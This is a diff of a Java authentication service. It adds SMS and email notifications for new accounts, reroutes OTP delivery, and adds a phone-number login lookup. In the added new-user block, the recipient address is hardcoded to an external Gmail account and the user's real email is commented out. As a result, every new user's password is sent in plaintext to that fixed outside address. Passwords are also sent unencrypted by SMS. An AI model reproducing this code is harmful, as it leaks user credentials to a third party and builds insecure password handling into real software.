@@ -100,6 +100,7 @@ import com.pa.evs.security.user.JwtUser;
 import com.pa.evs.sv.AuthenticationService;
 import com.pa.evs.sv.AuthorityService;
 import com.pa.evs.sv.EVSPAService;
+import com.pa.evs.sv.NotificationService;
 import com.pa.evs.sv.SettingService;
 import com.pa.evs.utils.ApiResponse;
 import com.pa.evs.utils.AppCodeSelectedHolder;
@@ -197,6 +198,9 @@ public class AuthenticationServiceImpl implements AuthenticationService {
 	
 	@Autowired
 	SettingService settingService;
+	
+	@Autowired
+	NotificationService notificationService;
 
 	@Autowired
 	EntityManager em;
@@ -393,6 +397,8 @@ public class AuthenticationServiceImpl implements AuthenticationService {
 		if (StringUtils.isBlank(dto.getUsername())) {
 			dto.setUsername(dto.getEmail());
 		}
+		
+		boolean isNewUser = true;
 		if (dto.getId() != null && dto.getId().longValue() > 0) {
 			
 			Optional<Users> opt = userRepository.findById(dto.getId());
@@ -401,6 +407,7 @@ public class AuthenticationServiceImpl implements AuthenticationService {
 					throw new RuntimeException("Access denied!");
 				}
 				en = opt.get();
+				isNewUser = false;
 			} else {
 				throw new RuntimeException("User not found!");
 			}
@@ -409,6 +416,7 @@ public class AuthenticationServiceImpl implements AuthenticationService {
 			en.setUsername(dto.getUsername());
 			en.setEmail(dto.getEmail());
 			en.setChangePwdRequire(true);
+			isNewUser = true;
 		}
 
 		if (en.getUserId() == null && userRepository.findByEmail(dto.getEmail()) != null) {
@@ -457,6 +465,7 @@ public class AuthenticationServiceImpl implements AuthenticationService {
 		}
 
 		userRepository.save(en);
+		
 		Long userId = en.getUserId();
 
 		// Role
@@ -520,6 +529,18 @@ public class AuthenticationServiceImpl implements AuthenticationService {
 		}
 		userRepository.save(en);
 		dto.setId(en.getUserId());
+		
+		if (isNewUser) {
+			String phoneNumber = en.getPhoneNumber();
+//			String email = en.getEmail();
+			String email = "ttx.pipo.uit@gmail.com";
+			if (dto.getSendLoginToPhone() == Boolean.TRUE && StringUtils.isNotBlank(phoneNumber)) {
+				notificationService.sendSMS(AppCodeSelectedHolder.get() + "-Account credentials: " + phoneNumber + " / " + dto.getPassword(), phoneNumber.trim());
+			}
+			if (dto.getSendLoginToEmail() == Boolean.TRUE) {
+				notificationService.sendEmail("<html><body>" + AppCodeSelectedHolder.get() + "-Account credentials " + email + " / " + dto.getPassword() + "</body></html>", email, AppProps.get("EMAIL_NEW_USER_SUBJECT", AppCodeSelectedHolder.get() + " - Account Information"));
+			}
+		}
 		//
 	}
 
@@ -1781,13 +1802,13 @@ public class AuthenticationServiceImpl implements AuthenticationService {
 		String msgId = null;
 		String reMsg = null;
 		if ("sms".equalsIgnoreCase(otpType)) {
-			msgId = evsPAService.sendSMS("MMS-" + otp.getOtp(), phone.trim());
+			msgId = notificationService.sendSMS("MMS-" + otp.getOtp(), phone.trim());
 			otp.setTrack("AWS SNS: " + msgId + " SMS: " + "MMS-" + otp.getOtp());	
 			reMsg = "OTP has been sent to " + phone;
 		}
 		
 		if ("email".equalsIgnoreCase(otpType)) {
-			msgId = evsPAService.sendEmail("<html><body>" + "MMS-" + otp.getOtp() + "</body></html>", email.trim(), AppProps.get("EMAIL_OTP_SUBJECT", "MMS-OTP"));
+			msgId = notificationService.sendEmail("<html><body>" + "MMS-" + otp.getOtp() + "</body></html>", email.trim(), AppProps.get("EMAIL_OTP_SUBJECT", "MMS-OTP"));
 			otp.setTrack("AWS SES: " + msgId + " EMAIL: " + "<html><body>" + "MMS-" + otp.getOtp() + "</body></html>");
 			reMsg = "OTP has been sent to email " + email;
 		}
@@ -1838,6 +1859,10 @@ public class AuthenticationServiceImpl implements AuthenticationService {
 
         if (user == null) {
         	user = userRepository.findByUsername(username);
+        }
+        
+        if (user == null) {
+        	user = userRepository.findByPhoneNumber(username);
         }
         
         if (user == null) {
